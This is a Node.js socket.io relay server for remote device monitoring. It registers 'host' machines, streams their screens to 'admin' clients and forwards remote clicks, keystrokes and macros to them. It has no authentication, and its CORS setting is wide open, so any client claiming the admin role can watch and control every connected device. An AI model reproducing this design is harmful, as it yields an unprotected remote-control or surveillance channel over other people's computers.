const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);

// PREMIUM UPGRADE: Force absolute CORS whitelisting for standalone binary agents
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: true
    },
    transports: ['websocket', 'polling'] // Allows seamless cross-protocol fallbacks
});

app.use(express.static(path.join(__dirname, 'public')));

const DB_PATH = path.join(__dirname, 'devices.json');
let devicesRegistry = {};

function loadDatabase() {
    try {
        if (fs.existsSync(DB_PATH)) {
            devicesRegistry = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
            Object.keys(devicesRegistry).forEach(key => {
                devicesRegistry[key].status = 'Offline';
            });
        }
    } catch (err) {
        devicesRegistry = {};
    }
}

function saveDatabase() {
    try {
        fs.writeFileSync(DB_PATH, JSON.stringify(devicesRegistry, null, 2), 'utf8');
    } catch (err) {
        console.error(err.message);
    }
}

loadDatabase();

io.on('connection', (socket) => {
    // Gracefully handle query parameters regardless of client architecture background status
    const role = socket.handshake.query.role || 'host';
    const deviceName = socket.handshake.query.deviceName || `NODE-${socket.id.slice(0, 5)}`;
    const platformOS = socket.handshake.query.platformOS || 'Windows';

    if (role === 'host') {
        console.log(`💻 Registering Monitored Node Endpoint Connection: ${deviceName}`);
        
        devicesRegistry[deviceName] = {
            id: socket.id,
            status: 'Online',
            os: platformOS,
            firstSeen: devicesRegistry[deviceName]?.firstSeen || new Date().toLocaleString(),
            lastSeen: new Date().toLocaleString()
        };
        
        saveDatabase();
        socket.join(`device-${deviceName}`);
        io.to('admins-room').emit('registry-update', devicesRegistry);
    }

    if (role === 'admin') {
        socket.join('admins-room');
        socket.emit('registry-update', devicesRegistry);

        socket.on('join-device-stream', (targetDevice) => {
            Array.from(socket.rooms).forEach(r => { if (r.startsWith('stream-')) socket.leave(r); });
            if (devicesRegistry[targetDevice] && devicesRegistry[targetDevice].status === 'Online') {
                socket.join(`stream-${targetDevice}`);
                io.to(`device-${targetDevice}`).emit('start-capture-stream');
            }
        });

        socket.on('leave-device-stream', (targetDevice) => {
            socket.leave(`stream-${targetDevice}`);
            const viewers = io.sockets.adapter.rooms.get(`stream-${targetDevice}`);
            if (!viewers || viewers.size === 0) {
                io.to(`device-${targetDevice}`).emit('stop-capture-stream');
            }
        });

        socket.on('force-frame-refresh', (targetDevice) => {
            io.to(`device-${targetDevice}`).emit('trigger-single-frame');
        });

        socket.on('remote-macro', (payload) => {
            io.to(`device-${payload.targetDevice}`).emit('execute-macro', payload.macro);
        });

        socket.on('remote-click', (payload) => {
            io.to(`device-${payload.targetDevice}`).emit('execute-click', payload.data);
        });

        socket.on('remote-type', (payload) => {
            io.to(`device-${payload.targetDevice}`).emit('execute-type', payload.data);
        });
    }

    socket.on('screen-data-stream', (base64Data) => {
        const hostName = Object.keys(devicesRegistry).find(k => devicesRegistry[k].id === socket.id);
        if (hostName) {
            io.to(`stream-${hostName}`).emit('screen-data', base64Data);
        }
    });

    socket.on('disconnect', () => {
        const hostName = Object.keys(devicesRegistry).find(k => devicesRegistry[k].id === socket.id);
        if (hostName) {
            devicesRegistry[hostName].status = 'Offline';
            devicesRegistry[hostName].lastSeen = new Date().toLocaleString();
            saveDatabase();
            io.to('admins-room').emit('registry-update', devicesRegistry);
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 Production Relay Core Operating on Port ${PORT}`));
